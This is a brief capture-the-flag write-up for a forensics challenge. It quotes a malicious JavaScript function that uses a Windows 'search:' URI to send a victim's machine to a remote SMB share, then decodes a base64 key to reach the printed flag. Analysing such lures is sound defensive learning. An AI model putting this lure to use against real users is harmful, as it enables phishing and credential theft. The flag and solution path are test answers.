# Challenge
A new Hire

The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

![[HTB Apocalypse/forensics/A new Hire/assets/Pasted image 20250322190826.png]]

inspecting the page, we found a malicious script
![[HTB Apocalypse/forensics/A new Hire/assets/Pasted image 20250322190842.png]]

The exploit appears to involve **capturing SMB credentials** via a malicious JavaScript payload. The key part of the attack is in this function:

``` javascript
function getResume() {
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
```
visiting the directory, we can find some other directories. Enumerating each directories until we got the flag.

![[HTB Apocalypse/forensics/A new Hire/assets/Pasted image 20250322191238.png]]

![[HTB Apocalypse/forensics/A new Hire/assets/Pasted image 20250322191255.png]]

from config/client.py we got some key, decoding this will get us the flag. 
![[HTB Apocalypse/forensics/A new Hire/assets/Pasted image 20250322191327.png]]

``` python
key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")
```

![[HTB Apocalypse/forensics/A new Hire/assets/Pasted image 20250322191358.png]]


```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
```